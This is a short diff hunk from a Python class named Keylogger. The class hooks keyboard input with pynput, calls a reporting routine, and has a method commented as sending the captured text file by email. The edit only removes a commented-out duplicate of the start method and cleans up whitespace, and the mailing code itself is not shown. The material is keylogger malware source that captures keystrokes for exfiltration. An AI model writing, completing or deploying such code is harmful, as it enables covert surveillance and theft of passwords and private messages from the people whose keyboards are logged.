@@ -130,16 +130,7 @@ class Keylogger:
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
             self.report()
-            keyboard_listener.join()
-       
-    
-    """ def start(self,repoTiming):
-        self.txt=repoTiming
-        keyboard_listener = pynput.keyboard.Listener(self.pressKey, self.leaveKey, self.process_key_press)
-        with keyboard_listener:
-            self.report()
-            keyboard_listener.join() """
-  
+            keyboard_listener.join() 
     
     #envia el txt al correo
     def sendmailwithtxt(self, email, password):
